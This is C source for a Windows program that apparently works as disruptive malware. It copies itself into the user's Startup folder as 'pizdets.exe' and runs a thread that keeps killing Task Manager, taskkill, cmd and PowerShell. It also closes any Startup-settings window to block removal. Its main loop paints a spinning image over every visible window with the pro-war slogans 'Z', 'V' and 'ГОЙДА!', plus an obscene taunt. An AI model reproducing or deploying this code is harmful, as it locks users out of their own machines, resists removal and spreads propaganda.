#define _USE_MATH_DEFINES
#include <math.h>
#include <shlwapi.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <tlhelp32.h>
#include <windows.h>

#define IMG_BG 0x000000
#define TEXT_BG 0x000000
#define TEXT_FG 0xff008f
#define ROT_SPEED 95  /* deg/s */
#define TEXT_SPEED 40 /* px/s */
#define FPS 60
#define FILL_STRETCH
#define NO_TASKMGR
#define EXTREME_KILLER
#define ADD_TO_STARTUP

typedef struct {
    HBRUSH hbrBg;
    HDC hdcRot;
    LONG w, h;
} PSTATE;

#ifdef NO_TASKMGR
BOOL gProcKilled = FALSE;

DWORD WINAPI ProcKiller(LPVOID lp)
{
    while (1) {
        HANDLE hSnp = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        PROCESSENTRY32 pEnt;
        pEnt.dwSize = sizeof(pEnt);
        BOOL hRes = Process32First(hSnp, &pEnt);
        while (hRes) {
            if (!strcasecmp(pEnt.szExeFile, "taskkill.exe") || !strcasecmp(pEnt.szExeFile, "taskmgr.exe") ||
                !strcasecmp(pEnt.szExeFile, "cmd.exe") || !strcasecmp(pEnt.szExeFile, "powershell.exe")) {
                HANDLE hProc = OpenProcess(PROCESS_TERMINATE, 0, pEnt.th32ProcessID);
                if (hProc) {
                    TerminateProcess(hProc, 9);
                    CloseHandle(hProc);
                    gProcKilled = TRUE;
                }
            }
            hRes = Process32Next(hSnp, &pEnt);
        }
        CloseHandle(hSnp);
#ifndef EXTREME_KILLER
        Sleep(500);
#endif
    }
}
#endif

BOOL CALLBACK EnumWndProc(HWND hwnd, LPARAM lPar)
{
    if (!IsWindowVisible(hwnd)) {
        return TRUE;
    }
    PSTATE *st = (PSTATE *)lPar;

#ifdef NO_TASKMGR
    WCHAR buf[256];
    GetWindowTextW(hwnd, buf, 256);
    if (StrStrW(buf, L"Автозагрузка") || StrStrW(buf, L"Startup")) {
        SendMessage(hwnd, WM_CLOSE, 0, 0);
        gProcKilled = TRUE;
        return TRUE;
    }
#endif

    HDC hdc = GetWindowDC(hwnd);
    if (!hdc) {
        return TRUE;
    }

    RECT r;
    GetWindowRect(hwnd, &r);
    r.right -= r.left;
    r.bottom -= r.top;
    r.left = r.top = 0;

#ifdef FILL_STRETCH
    StretchBlt(hdc, 0, 0, r.right, r.bottom, st->hdcRot, 0, 0, st->w, st->h, SRCCOPY);
#elif FILL_SQUARE
    LONG sqSide = r.right < r.bottom ? r.right : r.bottom;
    StretchBlt(hdc, (r.right - sqSide) / 2, (r.bottom - sqSide) / 2, sqSide, sqSide, st->hdcRot, 0, 0, st->w, st->h,
               SRCCOPY);
    RECT fr;
    fr.left = fr.top = 0;
    if (r.right > r.bottom) {
        fr.right = (r.right - sqSide) / 2;
        fr.bottom = sqSide;
    } else {
        fr.right = sqSide;
        fr.bottom = (r.bottom - sqSide) / 2;
    }
    FillRect(hdc, &fr, st->hbrBg);
    if (r.right > r.bottom) {
        fr.left = fr.right + sqSide;
        fr.right = r.right;
    } else {
        fr.top = fr.bottom + sqSide;
        fr.bottom = r.bottom;
    }
    FillRect(hdc, &fr, st->hbrBg);
#endif

    ReleaseDC(hwnd, hdc);
    return TRUE;
}

VOID Rot2(POINT *p, double a)
{
    LONG x_old = p->x;
    p->x = cos(a) * p->x - sin(a) * p->y;
    p->y = sin(a) * x_old + cos(a) * p->y;
}

int main(int argc, const char **argv)
{
#ifdef ADD_TO_STARTUP
    char cmdBuf[512];
    snprintf(cmdBuf, 512,
             "copy /y \"%s\" \"%%APPDATA:\"=%%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\pizdets.exe\"",
             argv[0]);
    system(cmdBuf);
#endif

    extern const char _binary_svo_bmp_start[];
    BITMAPFILEHEADER *bfh = (BITMAPFILEHEADER *)_binary_svo_bmp_start;
    BITMAPINFO *bmi = (BITMAPINFO *)(bfh + 1);
    void *ppv;
    HBITMAP hbm = CreateDIBSection(NULL, bmi, DIB_RGB_COLORS, &ppv, NULL, 0);
    SetDIBits(NULL, hbm, 0, bmi->bmiHeader.biHeight, (char *)bfh + bfh->bfOffBits, bmi, DIB_RGB_COLORS);

    PSTATE st = {.w = bmi->bmiHeader.biWidth, .h = bmi->bmiHeader.biHeight};

    HDC hdcMem = CreateCompatibleDC(NULL);
    SelectObject(hdcMem, hbm);

    st.hdcRot = CreateCompatibleDC(NULL);
    HBITMAP hbmRot = CreateBitmap(st.w, st.h, 1, 32, NULL);
    SelectObject(st.hdcRot, hbmRot);
    SetTextColor(st.hdcRot, TEXT_FG);
    SetBkColor(st.hdcRot, TEXT_BG);

    st.hbrBg = CreateSolidBrush(IMG_BG);

#ifdef NO_TASKMGR
    HANDLE hKiller = CreateThread(NULL, 0, ProcKiller, 0, 0, NULL);
    LONGLONG tEndAlert = 0;
#endif

    LARGE_INTEGER tscFreq, tscTicks, tscTicks0;
    QueryPerformanceFrequency(&tscFreq);
    QueryPerformanceCounter(&tscTicks0);

    while (1) {
        QueryPerformanceCounter(&tscTicks);
        LONGLONG t = (tscTicks.QuadPart - tscTicks0.QuadPart) * 1000 / tscFreq.QuadPart;

        POINT p[3];
        p[0].x = -st.w / 2;
        p[0].y = st.h / 2;
        p[1].x = -p[0].x;
        p[1].y = p[0].y;
        p[2].x = p[0].x;
        p[2].y = -p[0].y;

        double rotAng = (double)((t * ROT_SPEED) % 360000) * M_PI / 180000.0;

        for (int i = 0; i < 3; i++) {
            Rot2(&p[i], rotAng);
            p[i].x += st.w / 2;
            p[i].y = st.h / 2 - p[i].y;
        }

        RECT r = {.left = 0, .top = 0, .right = st.w, .bottom = st.h};
        FillRect(st.hdcRot, &r, st.hbrBg);
        PlgBlt(st.hdcRot, p, hdcMem, 0, 0, st.w, st.h, NULL, 0, 0);

        LONG w2 = st.w - 8, h2 = st.h - 16;
        int s = t * TEXT_SPEED / 1000;

#define CALC_X(z) (((z) / w2) % 2 ? w2 - ((z) % w2) : (z) % w2)
#define CALC_Y(z) (((z) / h2) % 2 ? h2 - ((z) % h2) : (z) % h2)

        TextOutA(st.hdcRot, CALC_X(s), CALC_Y(s), "Z", 1);
        TextOutA(st.hdcRot, CALC_X(s + 40), CALC_Y(s + 40), "V", 1);
        TextOutW(st.hdcRot, CALC_X(s + 80), CALC_Y(s + 80), L"ГОЙДА!", 6);

#ifdef NO_TASKMGR
        if (gProcKilled) {
            tEndAlert = t + 2000;
            gProcKilled = FALSE;
        }
        if (t < tEndAlert) {
            SetTextColor(st.hdcRot, 0x0000ff);
            TextOutW(st.hdcRot, (st.w - 8 * 8) / 2, (st.h - 16) / 2, L"Хуй тебе", 8);
            SetTextColor(st.hdcRot, TEXT_FG);
        }
#endif

        EnumWindows(EnumWndProc, (LPARAM)&st);

        LONGLONG t1;
        do {
            QueryPerformanceCounter(&tscTicks);
            t1 = (tscTicks.QuadPart - tscTicks0.QuadPart) * 1000 / tscFreq.QuadPart;
            Sleep(1);
        } while (t1 < t + 1000 / FPS);
    }
}